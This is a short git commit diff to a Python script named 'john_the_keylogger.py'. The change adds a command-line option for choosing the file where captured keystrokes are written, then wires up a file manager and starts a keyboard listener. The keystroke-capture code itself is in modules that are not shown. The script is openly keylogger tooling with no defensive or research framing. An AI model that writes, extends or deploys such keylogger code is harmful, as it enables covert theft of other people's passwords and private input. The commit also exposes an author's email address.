89ac97aa01922bf5e6455f18a3a3c161ebfef892
John H <jh.sec974@gmail.com>
2020-03-26 18:29:39 +0400

    #1

--- john_the_keylogger.py
+++ john_the_keylogger.py
@@ -1,8 +1,22 @@
+import argparse
+
 from models.file_manager import FileManager
 from models.keyboard_listener import KeyboardListener
 
 
-file_manager = FileManager()
+# argument parser
+parser = argparse.ArgumentParser()
+parser.add_argument("--file", help="File that will be used for writing", type=str)
+args = parser.parse_args()
 
+# file manager
+if args.file is None:
+    file_path = ""
+else:
+    file_path = args.file
+
+file_manager = FileManager(file_path)
+
+# keylogger
 keyboard_listener = KeyboardListener(file_manager)
 keyboard_listener.start()
